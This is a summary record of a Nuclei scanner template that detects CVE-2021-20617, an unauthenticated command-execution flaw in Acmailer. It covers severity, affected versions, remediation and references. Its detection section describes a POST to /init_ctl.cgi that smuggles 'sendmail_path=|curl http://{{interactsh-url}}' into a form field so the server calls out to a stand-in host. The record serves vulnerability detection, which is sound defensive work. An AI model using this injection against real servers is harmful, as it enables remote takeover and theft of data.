---
cve_id: CVE-2021-20617
template_path: nuclei-templates/http/cves/2021/CVE-2021-20617.yaml
affected_product: Acmailer
severity: critical
authentication: none
external_callback: true
affected_versions: acmailer ver. 4.0.1 and earlier, and acmailer DB ver. 1.1.3 and earlier
preconditions: []
poc_classification: rce
---

## Vulnerability
Improper access control vulnerability in Acmailer ver. 4.0.1 and earlier, and acmailer DB ver. 1.1.3 and earlier allows remote attackers to execute an arbitrary OS command, or gain an administrative privilege which may result in obtaining the sensitive information on the server via unspecified vectors. CVSS 3.1 score 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Impact includes arbitrary OS command execution or privilege escalation leading to full system compromise and sensitive data exposure. Remediation requires updating to the latest version of Acmailer and Acmailer DB.

## PoC / Detection
Classification: rce

The template sends a single unauthenticated raw POST request to `/init_ctl.cgi` containing form data that sets randomized admin_name/admin_email, login_id/login_pass values and injects the payload `sendmail_path=|curl http://{{interactsh-url}}&homeurl=...`. Detection confirms exploitation when the response shows status_code 302, body contains `<a href="index.cgi">`, and an out-of-band HTTP callback is received on interactsh with User-Agent: curl.

## References
- https://starlabs.sg/blog/2023/02-dissecting-the-vulnerabilities-a-comprehensive-teardown-of-acmailer/
- https://www.acmailer.jp/info/de.cgi?id=101
- https://jvn.jp/en/jp/JVN35906450/index.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-20617
